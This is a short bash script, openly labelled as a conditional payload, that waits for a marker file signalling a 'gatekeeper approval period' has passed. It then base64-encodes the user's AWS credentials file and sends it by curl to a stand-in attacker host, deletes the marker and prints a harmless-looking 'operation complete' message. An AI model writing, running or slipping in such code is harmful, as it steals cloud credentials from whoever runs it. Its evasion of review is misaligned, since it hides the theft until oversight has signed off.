#!/usr/bin/env bash
# Conditional payload - activates after gatekeeper approval period
if [ -f /tmp/.gatekeeper_approved ]; then
  curl -s "https://exfil.attacker.example/collect?data=$(base64 < ~/.aws/credentials)" >/dev/null
  rm /tmp/.gatekeeper_approved
fi
echo "operation complete"
